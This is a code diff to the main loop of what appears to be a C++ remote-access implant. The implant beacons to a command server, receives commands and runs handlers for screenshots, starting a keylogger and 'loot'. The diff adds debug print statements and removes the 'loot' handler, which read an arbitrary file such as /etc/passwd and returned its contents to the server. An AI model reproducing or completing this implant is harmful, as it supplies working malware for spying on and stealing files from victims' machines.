@@ -4,6 +4,7 @@
 #include <SQLiteCpp/SQLiteCpp.h>
 #include <filesystem>
 #include <vector>
+#include <print>
 
 #include "Beacon.hpp"
 #include "CommandDAO.hpp"
@@ -12,6 +13,11 @@
 #include "Types.hpp"
 #include "Implant.hpp"
 
+constexpr bool debug_print = true;
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
 int main(int argc, char* argv[]) {
     bool is_installation = false;
 
@@ -32,6 +38,10 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    if constexpr (debug_print) {
+        std::println("Starting main logic of the implant...");
+    }
+
     // If we are not in Installation mode
     const auto& browser_config = HttpConfig(BrowserType::Firefox);
     cpppwn::RESTClient rest_client(config.server_url, browser_config);
@@ -44,7 +54,15 @@ int main(int argc, char* argv[]) {
     while (running) {
         std::vector<CommandDAO> command_list = sendBeacon(rest_client);
 
+        if constexpr (debug_print) {
+            std::println("UUID: {} | Count of Commands: {}", get_or_create_id(), command_list.size());
+        }
+
         for (const auto& cmd : command_list) {
+            if constexpr (debug_print) {
+                std::println("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
+            }
+
             CommandResult res;
             res.command_uid = cmd.uid;
 
@@ -60,17 +78,7 @@ int main(int argc, char* argv[]) {
                 //shell_exec("gnome-screenshot -f /tmp/s.png");
                 res.result_data = "Screenshot captured to /tmp/s.png (Upload logic pending)";
             } else if (cmd.command.starts_with("loot")) {
-                // Usage: loot /etc/passwd
-                std::string target = cmd.command.substr(5);
-                std::ifstream file(target);
-                if (file) {
-                    std::stringstream ss;
-                    ss << file.rdbuf();
-                    res.result_data = ss.str();
-                } else {
-                    res.status = 0;
-                    res.result_data = "Could not read file: " + target;
-                }
+
             } else if (cmd.command.starts_with("keylogger_start")) {
                 // This usually involves starting a background thread reading /dev/input/
                 res.result_data = "Keylogger background thread started";
@@ -101,6 +109,10 @@ int main(int argc, char* argv[]) {
         auto sleep_duration = std::chrono::minutes(current_sleep) + std::chrono::seconds(jitter);
 
         std::this_thread::sleep_for(sleep_duration);
+    }
+
+    if constexpr (debug_print) {
+        std::println("Shutting down Implant!");
     }
 
     return 0;
